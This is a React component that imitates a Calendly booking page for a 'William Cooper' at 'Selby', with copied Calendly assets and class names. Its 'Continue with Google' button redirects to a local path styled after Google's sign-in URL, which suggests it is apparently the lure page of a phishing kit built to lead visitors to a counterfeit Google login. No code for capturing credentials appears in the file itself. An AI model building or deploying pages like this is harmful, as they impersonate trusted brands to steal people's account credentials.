import React from 'react';

// ✅ Import all assets
import clock from './assets/clock.2ced35e604aa6d1f8eea0c5026a61f6d.37ed247879b59fe743d5614e4f510d8c.svg';
import selbyLogo from './assets/580b57fcd9996e24bc43c4f3.ca0f7c39f6bfd4b8d691.png';
import camera from './assets/camera.d8eeb4352132a583d5a94936a8f1798a.3ed45bc0762ef3da2ace1c2096ada089.svg';
import calendlyLogo from './assets/calendly.8d2b1d88617b5da85edf35811ff2ab7a.d1075a2021262e0d7158fb3cedaf1527.svg';
import facebookIcon from './assets/gg.1655ccdd19b7c6beb6361aa61c823215.svg';
import globe from './assets/globe.1eae85210f348ab9e928a0dd6e17ff89.96b944207cce82b6585e3ec9b52c5639.svg';

function MainPage() {
  const handleButtonClick = () => {
   window.location.href="/v3/signin/identifierauthusercontinue="
  };

  return (
    <div id="root">
      <div className="calendy-div">
        <div className="calendy-grid">
          {/* Left Side */}
          <div className="left-side">
            <div>
              <img alt="Selby" className="selby-logo" src={selbyLogo} />
              <h3>William Cooper</h3>
              <h2>Meet William</h2>
              <div></div>

              <div className="calendy-div-icons">
                <div className="calendy-icons">
                  <img alt="clock" src={clock} />
                  <span>30 min</span>
                </div>

                <div className="calendy-icons" style={{ gap: '15px' }}>
                  <img alt="camera" src={camera} />
                  <span>
                    Web conferencing details provided upon confirmation.
                  </span>
                </div>

                <div className="footer-links">
                  <a href="#">Cookie settings</a>
                  <a href="#">Report abuse</a>
                </div>
              </div>
            </div>
          </div>

          {/* Right Side */}
          <div className="right-side">
            <a
              className="VJL48qbQzWENTFAh1Knk e9TS9yoMqqIN2PqBo1QG _i6SG2jlTfccH2ZZblil"
              href="/"
              data-discover="true"
            >
              <div
                data-id="branding"
                className="jWSwi_R_Xl7kPjUhuQoo _igrKj_5lj_5nWQu8DPw"
              >
                <div className="V7YfvNqWv0XKYKys7N7K __d5yUqDgBEjoX7J2dql">
                  powered by
                </div>
                <div className="HvybhIo63ZbBJxHh7Ann RK3ps09FjZwzHTaYDakl">
                  Calendly
                </div>
              </div>
            </a>

            <div>
              <div className="calendy-logo">
                <img alt="Calendly Logo" src={calendlyLogo} />
              </div>
              <h2>Schedule your call with us!</h2>
              <h3></h3>

              <div className="fb-text">
                <p className="fb-paragraphg">
                  <span>The easiest way for you to sign up is with Google.</span>
                  <span>This will automatically connect your calendar</span>
                  <span>so you can start using Calendly right away.</span>
                </p>

                <button onClick={handleButtonClick} className="fb-btn">
                  <img alt="Facebook" src={facebookIcon} style={{ width: '20px' }} />{' '}
                  Continue with Google
                </button>
              </div>
            </div>

            <div className="time">
              <h4>Time zone</h4>
              <div className="timezone">
                <img alt="globe" src={globe} />
                <span>Global (16:48)</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default MainPage;
